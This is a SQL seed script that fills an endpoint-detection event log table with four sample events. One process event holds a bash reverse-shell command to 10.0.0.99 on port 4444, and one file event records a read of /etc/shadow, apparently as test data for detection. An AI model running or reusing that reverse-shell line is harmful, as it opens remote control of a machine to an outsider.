-- Seed data for edr_logs
DO $$
BEGIN
  IF NOT EXISTS (SELECT 1 FROM event_logs LIMIT 1) THEN

    INSERT INTO event_logs (event_id, node_id, event_type, hostname, payload, raw_sequence_id, recorded_at) VALUES
      (
        'c1b2c3d4-0001-0000-0000-000000000001',
        'a1b2c3d4-0003-0000-0000-000000000003',
        'process_events',
        'prod-web-01',
        '{"pid": 14205, "path": "/bin/bash", "cmdline": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1", "parent_pid": 13300, "uid": 1000}'::jsonb,
        'seq-00001',
        now() - INTERVAL '3 hours'
      ),
      (
        'c1b2c3d4-0002-0000-0000-000000000002',
        'a1b2c3d4-0001-0000-0000-000000000001',
        'file_events',
        'dev-linux-01',
        '{"action": "open", "path": "/etc/shadow", "process": "cat", "pid": 8920, "uid": 1001, "flags": "O_RDONLY"}'::jsonb,
        'seq-00002',
        now() - INTERVAL '6 hours'
      ),
      (
        'c1b2c3d4-0003-0000-0000-000000000003',
        'a1b2c3d4-0002-0000-0000-000000000002',
        'socket_events',
        'dev-linux-02',
        '{"action": "connect", "dest_ip": "192.168.1.100", "dest_port": 22, "protocol": 6, "pid": 5512}'::jsonb,
        'seq-00003',
        now() - INTERVAL '1 day'
      ),
      (
        'c1b2c3d4-0004-0000-0000-000000000004',
        'a1b2c3d4-0004-0000-0000-000000000004',
        'process_events',
        'prod-db-01',
        '{"pid": 1024, "path": "/usr/bin/ps", "cmdline": "ps aux", "parent_pid": 1000, "uid": 0}'::jsonb,
        'seq-00004',
        now() - INTERVAL '2 days'
      );

  END IF;
END;
$$;
